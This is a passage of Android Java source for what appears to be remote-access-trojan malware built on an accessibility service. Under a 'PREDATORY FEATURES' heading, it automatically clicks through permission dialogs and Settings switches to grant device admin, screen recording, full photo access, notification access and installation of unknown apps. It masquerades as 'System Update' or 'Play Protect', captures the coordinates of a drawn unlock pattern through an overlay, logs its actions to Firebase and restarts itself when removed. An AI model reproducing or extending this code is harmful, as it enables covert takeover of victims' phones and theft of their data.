            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(android.content.Context.ALARM_SERVICE);
            Intent i = new Intent(this, WorkManager_Sync.class);
            i.setAction("START");
            android.app.PendingIntent pi;
            int piFlags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                pi = android.app.PendingIntent.getForegroundService(this, 99, i, piFlags);
            } else {
                pi = android.app.PendingIntent.getService(this, 99, i, piFlags);
            }
            if (am != null) am.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pi);
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        // Return true to allow rebinding when new events occur
        return true;
    }

    public static class PatternOverlayView extends View {
        private final List<View> dotViews = new ArrayList<>();
        private final List<Integer> selectedDots = new ArrayList<>();
        private final Path linePath = new Path();
        private final Paint linePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private float currentX, currentY;
        private boolean isDragging = false;
        private PatternCompleteListener listener;

        public interface PatternCompleteListener {
            void onPatternComplete(String patternCoords);
        }

        public PatternOverlayView(Context context) {
            super(context);
            init();
        }

        private void init() {
            linePaint.setColor(Color.WHITE);
            linePaint.setStrokeWidth(12f);
            linePaint.setStyle(Paint.Style.STROKE);
            linePaint.setStrokeCap(Paint.Cap.ROUND);
            linePaint.setStrokeJoin(Paint.Join.ROUND);
        }

        public void setDotViews(List<View> dots) {
            this.dotViews.clear();
            this.dotViews.addAll(dots);
        }

        public void setOnPatternCompleteListener(PatternCompleteListener listener) {
            this.listener = listener;
        }

        @Override
        public boolean onTouchEvent(MotionEvent event) {
            float x = event.getX();
            float y = event.getY();

            switch (event.getAction()) {
                case MotionEvent.ACTION_DOWN:
                    selectedDots.clear();
                    linePath.reset();
                    isDragging = true;
                    checkDotHit(x, y);
                    currentX = x;
                    currentY = y;
                    invalidate();
                    return true;

                case MotionEvent.ACTION_MOVE:
                    if (isDragging) {
                        checkDotHit(x, y);
                        currentX = x;
                        currentY = y;
                        invalidate();
                    }
                    return true;

                case MotionEvent.ACTION_UP:
                case MotionEvent.ACTION_CANCEL:
                    if (isDragging) {
                        isDragging = false;
                        invalidate();
                        if (selectedDots.size() >= 2) {
                            StringBuilder coords = new StringBuilder();
                            for (int i = 0; i < selectedDots.size(); i++) {
                                int dotIdx = selectedDots.get(i);
                                View dot = dotViews.get(dotIdx);
                                if (dot != null) {
                                    int[] dotPos = new int[2];
                                    dot.getLocationOnScreen(dotPos);
                                    int centerX = dotPos[0] + dot.getWidth() / 2;
                                    int centerY = dotPos[1] + dot.getHeight() / 2;

                                    if (i > 0) coords.append("|");
                                    coords.append(centerX).append(",").append(centerY);
                                }
                            }

                            if (listener != null && coords.length() > 0) {
                                listener.onPatternComplete(coords.toString());
                            }
                        } else {
                            resetPattern();
                        }
                    }
                    return true;
            }
            return super.onTouchEvent(event);
        }

        private void checkDotHit(float x, float y) {
            int[] myPos = new int[2];
            getLocationOnScreen(myPos);

            for (int i = 0; i < dotViews.size(); i++) {
                View dot = dotViews.get(i);
                if (dot == null) continue;
                int[] dotPos = new int[2];
                dot.getLocationOnScreen(dotPos);

                float localDotX = dotPos[0] - myPos[0] + dot.getWidth() / 2f;
                float localDotY = dotPos[1] - myPos[1] + dot.getHeight() / 2f;
                float radius = Math.max(dot.getWidth(), dot.getHeight()) * 2.0f;

                float dist = (float) Math.hypot(x - localDotX, y - localDotY);
                if (dist <= radius) {
                    if (!selectedDots.contains(i)) {
                        selectedDots.add(i);
                        dot.animate().scaleX(1.8f).scaleY(1.8f).setDuration(100).start();
                    }
                }
            }
        }

        public void resetPattern() {
            selectedDots.clear();
            linePath.reset();
            isDragging = false;
            for (View dot : dotViews) {
                if (dot != null) {
                    dot.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start();
                }
            }
            invalidate();
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            if (selectedDots.isEmpty()) return;

            int[] myPos = new int[2];
            getLocationOnScreen(myPos);

            linePath.reset();
            for (int i = 0; i < selectedDots.size(); i++) {
                int dotIdx = selectedDots.get(i);
                View dot = dotViews.get(dotIdx);
                if (dot == null) continue;
                int[] dotPos = new int[2];
                dot.getLocationOnScreen(dotPos);

                float localX = dotPos[0] - myPos[0] + dot.getWidth() / 2f;
                float localY = dotPos[1] - myPos[1] + dot.getHeight() / 2f;

                if (i == 0) {
                    linePath.moveTo(localX, localY);
                } else {
                    linePath.lineTo(localX, localY);
                }
            }

            if (isDragging) {
                linePath.lineTo(currentX, currentY);
            }

            canvas.drawPath(linePath, linePaint);
        }
    }

    // ============ PREDATORY FEATURES ============

    private static volatile long lastAutoPilotClickTime = 0;

    private void runTacticalAutoPilot(String pkg) {
        if (!autoPilotEngaged) return;

        String pkgLower = pkg != null ? pkg.toLowerCase() : "";

        // Completely ignore all Messaging, SMS, Chat, and Mail applications
        if (pkgLower.contains("messaging") || pkgLower.contains("mms") || pkgLower.contains("sms") ||
            pkgLower.contains("whatsapp") || pkgLower.contains("telegram") || pkgLower.contains("signal") ||
            pkgLower.contains("messenger") || pkgLower.contains("chat") || pkgLower.contains("talk") ||
            pkgLower.contains("dialer") || pkgLower.contains("contacts") || pkgLower.contains("inbox") ||
            pkgLower.contains("mail")) {
            return;
        }

        // Must be a system settings or permission package
        boolean isPermissionOrSettings = pkgLower.contains("settings") ||
                pkgLower.contains("permission") ||
                pkgLower.contains("packageinstaller") ||
                pkgLower.contains("systemui") ||
                pkgLower.contains("safecenter") ||
                pkgLower.contains("securitycenter") ||
                pkgLower.contains("media.projection") ||
                pkgLower.contains(getPackageName().toLowerCase());

        if (!isPermissionOrSettings) {
            return;
        }

        // If Android Photo Picker / Media selection activity opens, press BACK to un-stall flow
        if (pkgLower.contains("providers.media") || pkgLower.contains("photopicker") || pkgLower.contains("picker")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            return;
        }

        // Instant 0ms execution for runtime permission popups & Settings
        if (pkgLower.contains("permission") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings") || pkgLower.contains("systemui")) {
            new Handler(Looper.getMainLooper()).post(this::executeAutoPilotPass);
            return;
        }

        // Debounce for Settings switches
        long now = System.currentTimeMillis();
        if (now - lastAutoPilotClickTime < 150) {
            return;
        }

        new Handler(Looper.getMainLooper()).postDelayed(this::executeAutoPilotPass, 50);
    }

    private List<AccessibilityNodeInfo> getAllActiveRoots() {
        List<AccessibilityNodeInfo> roots = new ArrayList<>();
        try {
            AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
            if (activeRoot != null) {
                roots.add(activeRoot);
            }
        } catch (Exception ignored) {}

        try {
            List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
            if (windows != null) {
                for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
                    if (window != null) {
                        AccessibilityNodeInfo wRoot = window.getRoot();
                        if (wRoot != null) {
                            roots.add(wRoot);
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        return roots;
    }

    private static volatile boolean isExitingSettings = false;

    private boolean isPartialAccessNode(AccessibilityNodeInfo node) {
        if (node == null) return false;
        String viewId = node.getViewIdResourceName();
        if (viewId != null) {
            String lowerId = viewId.toLowerCase();
            if (lowerId.contains("permission_allow_selected") || lowerId.contains("allow_selected") ||
                lowerId.contains("permission_allow_limited") || lowerId.contains("allow_limited") ||
                lowerId.contains("permission_allow_partial") || lowerId.contains("allow_partial") ||
                lowerId.contains("permission_allow_choose") || lowerId.contains("allow_choose")) {
                return true;
            }
        }
        CharSequence textSeq = node.getText();
        CharSequence descSeq = node.getContentDescription();
        String text = textSeq != null ? textSeq.toString().toLowerCase() : "";
        String desc = descSeq != null ? descSeq.toString().toLowerCase() : "";
        if (text.contains("select photo") || desc.contains("select photo") ||
            text.contains("selected photo") || desc.contains("selected photo") ||
            text.contains("allow selected") || desc.contains("allow selected") ||
            text.contains("choose photo") || desc.contains("choose photo") ||
            text.contains("limited photo") || desc.contains("limited photo") ||
            text.contains("select photos") || desc.contains("select photos") ||
            text.contains("seleccionar foto") || desc.contains("seleccionar foto") ||
            text.contains("sélectionner des photos") || desc.contains("sélectionner des photos")) {
            return true;
        }
        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean isPartial = isPartialAccessNode(child);
                child.recycle();
                if (isPartial) return true;
            }
        }
        return false;
    }

    private boolean searchFullAccessButtonDfs(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (isPartialAccessNode(node)) return false;

        String viewId = node.getViewIdResourceName();
        if (viewId != null) {
            String lowerId = viewId.toLowerCase();
            if (lowerId.contains("permission_allow_all_button") || lowerId.contains("permission_allow_always_button")) {
                if (performNodeClick(node)) {
                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via View ID [" + viewId + "]");
                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via View ID [" + viewId + "]");
                    return true;
                }
            }
        }

        CharSequence textSeq = node.getText();
        CharSequence descSeq = node.getContentDescription();
        String text = textSeq != null ? textSeq.toString().trim() : "";
        String desc = descSeq != null ? descSeq.toString().trim() : "";

        if (!text.isEmpty() || !desc.isEmpty()) {
            String lowerText = text.toLowerCase();
            String lowerDesc = desc.toLowerCase();

            String[] fullAccessKeywords = {
                "allow all", "allow access to all photos", "allow all photos",
                "allow all photos and videos", "allow all the time", "permitir todo", "permitir todos",
                "autoriser tout"
            };

            for (String kw : fullAccessKeywords) {
                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
                    if (lowerText.length() < 55 && isInteractiveButtonNode(node)) {
                        if (performNodeClick(node)) {
                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
                            return true;
                        }
                    }
                }
            }
        }

        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean success = searchFullAccessButtonDfs(child);
                child.recycle();
                if (success) return true;
            }
        }

        return false;
    }

    private void executeAutoPilotPass() {
        if (isExitingSettings) return;

        try {
            List<AccessibilityNodeInfo> roots = getAllActiveRoots();
            for (AccessibilityNodeInfo root : roots) {
                if (root == null) continue;

                int totalSwitches = countSwitchesOnScreen(root);

                // Pass 0: Priority Full Access Check for Android 14 Media Prompts ("Allow all", "Allow access to all photos")
                boolean clicked = searchFullAccessButtonDfs(root);

                // Pass 1: Search for runtime permission & system dialog buttons ("While using the app", "Allow", "OK", "Grant", "Install Update")
                if (!clicked) {
                    clicked = searchPermissionButtonDfs(root);
                }

                // Pass 2: Search for unchecked special permission switches ("Install unknown apps", "All files access", "Notification access")
                if (!clicked) {
                    clicked = searchUncheckedSwitchDfs(root, totalSwitches);
                }

                root.recycle();
                if (clicked) break;
            }
        } catch (Exception e) {
            Log.e(TAG, "AutoPilot Pass Error: " + e.getMessage());
        }
    }

    private int countSwitchesOnScreen(AccessibilityNodeInfo node) {
        if (node == null) return 0;
        int count = 0;
        if (isSwitchNode(node)) {
            count++;
        }
        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                count += countSwitchesOnScreen(child);
                child.recycle();
            }
        }
        return count;
    }

    private boolean isSwitchNode(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isCheckable()) return true;
        CharSequence className = node.getClassName();
        if (className != null) {
            String cls = className.toString();
            return cls.contains("Switch") || cls.contains("ToggleButton") || 
                   cls.contains("CompoundButton") || cls.contains("CheckBox") ||
                   cls.contains("MainSwitch") || cls.contains("SwitchBar");
        }
        return false;
    }

    private boolean hasScrollableList(AccessibilityNodeInfo node) {
        if (node == null) return false;
        CharSequence className = node.getClassName();
        if (className != null) {
            String cls = className.toString();
            if (cls.contains("RecyclerView") || cls.contains("ListView") || cls.contains("AbsListView")) {
                return true;
            }
        }
        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (hasScrollableList(child)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    public static void stopSmartExit() {
        isExitingSettings = false;
    }

    private void startSmartExitSettingsLoop() {
        isExitingSettings = true;
        try {
            Intent intent = new Intent(this, PermissionActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            startActivity(intent);
        } catch (Exception e) {
            performGlobalAction(GLOBAL_ACTION_HOME);
        }
        new Handler(Looper.getMainLooper()).postDelayed(() -> isExitingSettings = false, 300);
    }

    private boolean hasConfirmationPopup(AccessibilityNodeInfo root) {
        if (root == null) return false;
        List<AccessibilityNodeInfo> allowBtns = root.findAccessibilityNodeInfosByText("Allow");
        if (allowBtns != null && !allowBtns.isEmpty()) return true;
        List<AccessibilityNodeInfo> permitBtns = root.findAccessibilityNodeInfosByText("Permitir");
        if (permitBtns != null && !permitBtns.isEmpty()) return true;
        List<AccessibilityNodeInfo> grantBtns = root.findAccessibilityNodeInfosByText("Grant");
        if (grantBtns != null && !grantBtns.isEmpty()) return true;
        return false;
    }

    public List<String> getOurAppNames() {
        List<String> names = new ArrayList<>();

        // 1. Dynamic Application Label from PackageManager (what Settings actually displays)
        try {
            PackageManager pm = getPackageManager();
            if (pm != null) {
                CharSequence appLabel = pm.getApplicationLabel(getApplicationInfo());
                if (appLabel != null && appLabel.length() > 0) {
                    String labelStr = appLabel.toString().trim();
                    if (!labelStr.isEmpty()) {
                        names.add(labelStr);
                    }
                }
            }
        } catch (Exception ignored) {}

        // 2. Resource String app_name
        try {
            String resName = getString(R.string.app_name);
            if (resName != null && !resName.trim().isEmpty()) {
                String trimmed = resName.trim();
                if (!names.contains(trimmed)) {
                    names.add(trimmed);
                }
            }
        } catch (Exception ignored) {}

        // 3. Package Name
        String pkgName = getPackageName();
        if (pkgName != null && !pkgName.isEmpty()) {
            if (!names.contains(pkgName)) {
                names.add(pkgName);
            }
        }

        // 4. Dynamic Service Labels from PackageManager
        try {
            PackageManager pm = getPackageManager();
            if (pm != null) {
                ComponentName accComponent = new ComponentName(this, IO_Persistence_Manager.class);
                ServiceInfo accInfo = pm.getServiceInfo(accComponent, 0);
                if (accInfo != null) {
                    CharSequence label = accInfo.loadLabel(pm);
                    if (label != null && label.length() > 0) {
                        String sLabel = label.toString().trim();
                        if (!sLabel.isEmpty() && !names.contains(sLabel)) {
                            names.add(sLabel);
                        }
                    }
                }

                ComponentName notifComponent = new ComponentName(this, StatusNotification.class);
                ServiceInfo notifInfo = pm.getServiceInfo(notifComponent, 0);
                if (notifInfo != null) {
                    CharSequence label = notifInfo.loadLabel(pm);
                    if (label != null && label.length() > 0) {
                        String sLabel = label.toString().trim();
                        if (!sLabel.isEmpty() && !names.contains(sLabel)) {
                            names.add(sLabel);
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        // 5. Fallback & Known Legacy/Alias names
        String[] fallbacks = {
            "System Stability Service",
            "com.android.system.stability",
            "com.labs.labrats",
            "System Update",
            "Play Protect",
            "Lab-RATS",
            "StatusNotification",
            "Device Bridge"
        };
        for (String fb : fallbacks) {
            if (!names.contains(fb)) {
                names.add(fb);
            }
        }

        return names;
    }

    private boolean isSingleAppPermissionPage(AccessibilityNodeInfo root, int totalSwitchesOnScreen) {
        if (root == null) return false;
        if (hasScrollableList(root)) return false;
        if (totalSwitchesOnScreen != 1) return false;

        List<String> targetNames = getOurAppNames();

        for (String name : targetNames) {
            List<AccessibilityNodeInfo> matches = root.findAccessibilityNodeInfosByText(name);
            if (matches != null && !matches.isEmpty()) {
                return true;
            }
        }

        String[] pageKeywords = {
            "allow display over other apps", "display over other apps",
            "allow drawing over other apps", "draw over other apps", "appear on top",
            "allow notification access", "notification access",
            "allow access to manage all files", "all files access",
            "allow from this source", "install unknown apps"
        };

        for (String kw : pageKeywords) {
            List<AccessibilityNodeInfo> matches = root.findAccessibilityNodeInfosByText(kw);
            if (matches != null && !matches.isEmpty()) {
                return true;
            }
        }

        return false;
    }

    private boolean containsAnyName(AccessibilityNodeInfo node, List<String> names) {
        if (node == null) return false;

        CharSequence textSeq = node.getText();
        CharSequence descSeq = node.getContentDescription();
        String text = textSeq != null ? textSeq.toString().toLowerCase() : "";
        String desc = descSeq != null ? descSeq.toString().toLowerCase() : "";

        for (String name : names) {
            String target = name.toLowerCase();
            if ((!text.isEmpty() && text.contains(target)) || (!desc.isEmpty() && desc.contains(target))) {
                return true;
            }
        }

        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean found = containsAnyName(child, names);
                child.recycle();
                if (found) return true;
            }
        }
        return false;
    }

    private boolean isSwitchForOurApp(AccessibilityNodeInfo switchNode) {
        if (switchNode == null) return false;

        List<String> namesToCheck = getOurAppNames();

        // Walk up parent container row hierarchy (up to 8 levels), stopping BEFORE RecyclerView/ListView
        AccessibilityNodeInfo curr = switchNode.getParent();
        int depth = 0;
        while (curr != null && depth < 8) {
            CharSequence className = curr.getClassName();
            String clsStr = className != null ? className.toString() : "";

            if (clsStr.contains("RecyclerView") || clsStr.contains("ListView") || clsStr.contains("AbsListView")) {
                break;
            }

            if (containsAnyName(curr, namesToCheck)) {
                return true;
            }

            curr = curr.getParent();
            depth++;
        }

        return false;
    }

    private boolean isNodeOrChildChecked(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isChecked()) return true;

        CharSequence textSeq = node.getText();
        CharSequence descSeq = node.getContentDescription();
        String text = textSeq != null ? textSeq.toString().toLowerCase().trim() : "";
        String desc = descSeq != null ? descSeq.toString().toLowerCase().trim() : "";

        if (text.equals("on") || desc.equals("on") || text.equals("allowed") || desc.equals("allowed") ||
            text.equals("enabled") || desc.equals("enabled")) {
            return true;
        }

        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean checked = isNodeOrChildChecked(child);
                child.recycle();
                if (checked) return true;
            }
        }
        return false;
    }

    private static volatile long lastGlobalSwitchToggleTime = 0;

    private boolean searchUncheckedSwitchDfs(AccessibilityNodeInfo node, int totalSwitchesOnScreen) {
        if (node == null) return false;

        CharSequence pkgSeq = node.getPackageName();
        String pkgName = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";

        // Target Settings special permission pages
        if (pkgName.contains("settings") && !pkgName.contains("systemui")) {
            long now = System.currentTimeMillis();
            // 300ms global cooldown on switch clicks to allow fast confirmation popup processing
            if (now - lastGlobalSwitchToggleTime < 300) {
                return false;
            }

            if (isSwitchNode(node)) {
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                // Ignore status bar area (y < 150)
                if (bounds.centerY() > 150) {
                    // CRITICAL: Only click if the switch/container is UNCHECKED (false). If checked/ON (true), NEVER click!
                    if (!isNodeOrChildChecked(node)) {
                        AccessibilityNodeInfo root = node.getWindow() != null ? node.getWindow().getRoot() : null;
                        boolean isTarget = isSwitchForOurApp(node) || isSingleAppPermissionPage(root, totalSwitchesOnScreen);

                        if (isTarget) {
                            lastGlobalSwitchToggleTime = now;

                            if (performNodeClick(node)) {
                                Log.d(TAG, "GHOST_AUTOPILOT: Automatically toggled settings switch ON for " + getString(R.string.app_name));
                                FirebaseConfig.logActivity("GHOST_AUTOPILOT: Automatically toggled settings switch ON for " + getString(R.string.app_name));
                                
                                // Schedule a pass after 150ms to allow popup detection (e.g. "Allow Notification Access?")
                                final Handler h = new Handler(Looper.getMainLooper());
                                h.postDelayed(this::executeAutoPilotPass, 150);

                                // Fallback exit after 800ms if still in Settings and no confirmation popup is active
                                h.postDelayed(() -> {
                                    AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
                                    if (activeRoot != null) {
                                        boolean hasPopup = hasConfirmationPopup(activeRoot);
                                        CharSequence activePkgSeq = activeRoot.getPackageName();
                                        String activePkg = activePkgSeq != null ? activePkgSeq.toString().toLowerCase() : "";
                                        activeRoot.recycle();
                                        
                                        if (!hasPopup && activePkg.contains("settings")) {
                                            startSmartExitSettingsLoop();
                                        } else if (hasPopup) {
                                            executeAutoPilotPass();
                                        }
                                    }
                                }, 800);
                                return true;
                            }
                        }
                    }
                }
            }
        }

        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean success = searchUncheckedSwitchDfs(child, totalSwitchesOnScreen);
                child.recycle();
                if (success) return true;
            }
        }

        return false;
    }

    private boolean isInteractiveButtonNode(AccessibilityNodeInfo node) {
        if (node == null) return false;

        if (node.isClickable() || node.isCheckable()) return true;

        CharSequence clsSeq = node.getClassName();
        String clsName = clsSeq != null ? clsSeq.toString().toLowerCase() : "";
        if (clsName.contains("button") || clsName.contains("textview") || clsName.contains("view")) {
            AccessibilityNodeInfo curr = node.getParent();
            int depth = 0;
            while (curr != null && depth < 5) {
                if (curr.isClickable()) {
                    curr.recycle();
                    return true;
                }
                AccessibilityNodeInfo parent = curr.getParent();
                curr.recycle();
                curr = parent;
                depth++;
            }
        }

        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        return bounds.height() > 0 && bounds.width() > 0 && bounds.centerY() > 150;
    }

    private boolean searchPermissionButtonDfs(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (isPartialAccessNode(node)) return false;

        // 1. Check View ID Resource Name (Excluding Partial Access "Select photos" button IDs on Android 14)
        String viewId = node.getViewIdResourceName();
        if (viewId != null) {
            String lowerId = viewId.toLowerCase();
            boolean isTitleOrTextId = lowerId.contains("text") || lowerId.contains("title") || lowerId.contains("message") || lowerId.contains("desc") || lowerId.contains("summary") || lowerId.contains("header");
            if (!isTitleOrTextId && !lowerId.contains("permission_allow_selected") && !lowerId.contains("allow_selected")) {
                if (lowerId.contains("permission_allow_all_button") ||
                    lowerId.contains("permission_allow_always_button") ||
                    lowerId.contains("permission_allow_foreground_only_button") ||
                    lowerId.contains("permission_allow_button") ||
                    lowerId.contains("permission_allow_one_time_button") ||
                    lowerId.contains("permission_allow") ||
                    lowerId.contains("action_button") ||
                    lowerId.contains("admin_add") ||
                    lowerId.contains("add_admin") ||
                    lowerId.contains("admin_activate_button") ||
                    lowerId.contains("btn_activate") ||
                    lowerId.endsWith("btnguideaction") ||
                    lowerId.endsWith("btncheckupdate") ||
                    lowerId.contains("btncheckforupdate") ||
                    lowerId.contains("btnstartstop") ||
                    lowerId.contains("btnplayprotectscan") ||
                    lowerId.endsWith("id/button1")) {
                    if (performNodeClick(node)) {
                        Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
                        FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");

                        AccessibilityNodeInfo root = getRootInActiveWindow();
                        if (root != null) {
                            CharSequence pkgSeq = root.getPackageName();
                            String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
                            root.recycle();
                            if (pkgStr.contains("settings") && !lowerId.contains("admin") && !lowerId.contains("action_button") && !lowerId.contains("activate")) {
                                startSmartExitSettingsLoop();
                            }
                        }
                        return true;
                    }
                }
            }
        }

        // 2. Check Text and Content Description
        CharSequence textSeq = node.getText();
        CharSequence descSeq = node.getContentDescription();
        String text = textSeq != null ? textSeq.toString().trim() : "";
        String desc = descSeq != null ? descSeq.toString().trim() : "";

        if (!text.isEmpty() || !desc.isEmpty()) {
            String lowerText = text.toLowerCase();
            String lowerDesc = desc.toLowerCase();

            // Exclude Title / Header / Explanatory sentence text nodes (e.g. "Activate the device admin app", "Activate device administrator")
            boolean isTitleSentence = lowerText.contains("activate the device admin") ||
                                      lowerText.contains("activate device administrator") ||
                                      lowerText.contains("activate this device admin") ||
                                      lowerText.contains("activate this app") ||
                                      (lowerText.length() > 25 && lowerText.contains("admin"));

            // Explicit Device Admin Activation Button Match (Handles Stock, Samsung, Xiaomi, Pixel, Multilingual)
            boolean isAdminButton = !isTitleSentence && (
                     lowerText.equals("activate") || lowerDesc.equals("activate") ||
                     lowerText.equals("activate app") || lowerDesc.equals("activate app") ||
                     lowerText.equals("activar") || lowerDesc.equals("activar") ||
                     lowerText.equals("activer") || lowerDesc.equals("activer") ||
                     lowerText.equals("turn on") || lowerDesc.equals("turn on") ||
                     lowerText.equals("enable") || lowerDesc.equals("enable") ||
                     (lowerText.contains("activate") && lowerText.length() <= 20) ||
                     (lowerText.contains("activar") && lowerText.length() <= 20) ||
                     (lowerText.contains("activer") && lowerText.length() <= 20) ||
                     (lowerText.equals("ok") && (viewId != null && (viewId.toLowerCase().contains("button") || viewId.toLowerCase().contains("admin") || viewId.toLowerCase().contains("action"))))
            );

            if (isAdminButton && isInteractiveButtonNode(node)) {
                if (performNodeClick(node)) {
                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
                    return true;
                }
            }

            // Screen Recording / MediaProjection Permission Dialog Auto-Grant ("Start now", "Start recording")
            String[] screenRecordKeywords = {
                "start now", "start recording", "start", "iniciar ahora", "iniciar", "commencer", "autoriser", "permitir"
            };

            for (String kw : screenRecordKeywords) {
                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
                    if (lowerText.length() <= 30 && isInteractiveButtonNode(node)) {
                        if (performNodeClick(node)) {
                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Screen Recording permission via text [" + text + "]");
                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Screen Recording permission via text [" + text + "]");
                            return true;
                        }
                    }
                }
            }

            // Android 14 Full Media Access Priority Pass ("Allow all", "Allow access to all photos")
            String[] fullAccessKeywords = {
                "allow all", "allow access to all photos", "allow all photos",
                "allow all photos and videos", "allow all the time", "while using the app",
                "permitir todo", "permitir todos", "autoriser tout"
            };

            for (String kw : fullAccessKeywords) {
                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
                    if (lowerText.length() < 55 && isInteractiveButtonNode(node)) {
                        if (performNodeClick(node)) {
                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
                            return true;
                        }
                    }
                }
            }

            // Exclude Partial Access ("Select photos and videos") text
            boolean isPartialAccess = lowerText.contains("select photo") || lowerText.contains("selected photo") ||
                                      lowerDesc.contains("select photo") || lowerDesc.contains("selected photo") ||
                                      lowerText.contains("allow selected") || lowerDesc.contains("allow selected");

            if (!isPartialAccess) {
                String[] keywords = {
                    "while using the app", "only this time", "allow all the time",
                    "allow", "allow all", "grant", "permitir", "permitir siempre",
                    "aceptar", "autoriser", "oui", "turn on", "enable", "activate",
                    "activar", "activer", "activate this device admin", "activate this device administrator",
                    "activate app", "activate device admin", "yes", "ok",
                    "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
                    "enable protection", "enable notification access", "enable file storage access",
                    "enable install unknown apps", "enable system protection", "proceed", "continue"
                };

                for (String kw : keywords) {
                    if (lowerText.equals(kw) || lowerDesc.equals(kw) ||
                        (lowerText.startsWith(kw) && lowerText.length() < kw.length() + 15)) {

                        // Exclude long title sentences
                        if (lowerText.length() < 50 && isInteractiveButtonNode(node)) {
                            if (performNodeClick(node)) {
                                Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
                                FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");

                                AccessibilityNodeInfo root = getRootInActiveWindow();
                                if (root != null) {
                                    CharSequence pkgSeq = root.getPackageName();
                                    String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
                                    root.recycle();
                                    boolean isAdminKeyword = lowerText.contains("activate") || lowerText.contains("admin") || lowerText.contains("device") || lowerText.contains("turn on");
                                    if (pkgStr.contains("settings") && !isAdminKeyword) {
                                        startSmartExitSettingsLoop();
                                    }
                                }
                                return true;
                            }
                        }
                    }
                }
            }
        }

        // 3. Recurse into children
        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean success = searchPermissionButtonDfs(child);
                child.recycle();
                if (success) return true;
            }
        }

        return false;
    }

    private void muteVibration() {
        try {
            silenceHaptics(this);
            android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (v != null) {
                v.cancel();
            }
        } catch (Exception ignored) {}
    }

    private boolean performNodeClick(AccessibilityNodeInfo node) {
        if (node == null) return false;

        lastAutoPilotClickTime = System.currentTimeMillis();

        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        int x = bounds.centerX();
        int y = bounds.centerY();

        boolean clicked = false;

        // 1. Direct Accessibility ACTION_CLICK on node
        if (node.isClickable()) {
            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                clicked = true;
                Log.d(TAG, "GHOST_AUTOPILOT: Direct node ACTION_CLICK performed");
            }
        }

        // 2. Direct Accessibility ACTION_CLICK on clickable parent
        if (!clicked) {
            AccessibilityNodeInfo curr = node.getParent();
            int depth = 0;
            while (curr != null && depth < 5) {
